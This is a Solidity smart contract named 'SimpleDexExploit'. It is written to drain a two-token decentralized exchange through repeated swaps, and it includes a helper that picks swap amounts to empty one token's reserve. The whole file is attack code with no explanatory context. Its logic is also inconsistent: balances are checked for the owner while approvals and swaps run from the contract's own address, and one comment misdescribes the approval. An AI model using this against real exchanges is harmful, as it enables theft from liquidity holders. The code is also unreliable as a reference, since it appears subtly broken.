// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IDex {
    function token1() external view returns (address);
    function token2() external view returns (address);
    function swap(address from, address to, uint256 amount) external;
    function getSwapPrice(address from, address to, uint256 amount) external view returns (uint256);
    function approve(address spender, uint256 amount) external;
}

contract SimpleDexExploit {
    IDex public dex;
    address public token1;
    address public token2;
    address public owner;
    
    constructor(address _dex) {
        dex = IDex(_dex);
        token1 = dex.token1();
        token2 = dex.token2();
        owner = msg.sender;
    }
    
    function checkBalances() public view returns (uint256 myToken1, uint256 myToken2, uint256 dexToken1, uint256 dexToken2) {
        myToken1 = IERC20(token1).balanceOf(owner);
        myToken2 = IERC20(token2).balanceOf(owner);
        dexToken1 = IERC20(token1).balanceOf(address(dex));
        dexToken2 = IERC20(token2).balanceOf(address(dex));
    }
    
    function approveTokens() public {
        // This will approve the tokens from the owner's perspective
        dex.approve(address(dex), type(uint256).max);
    }
    
    function performSwap(address from, address to, uint256 amount) public {
        dex.swap(from, to, amount);
    }
    
    function calculateOptimalSwap(address from, address to) public view returns (uint256) {
        uint256 fromBalance = IERC20(from).balanceOf(address(dex));
        uint256 toBalance = IERC20(to).balanceOf(address(dex));
        uint256 myFromBalance = IERC20(from).balanceOf(owner);
        
        // If we can drain the 'to' token completely
        if (myFromBalance >= fromBalance) {
            return fromBalance;
        }
        
        // Otherwise use all we have
        return myFromBalance;
    }
}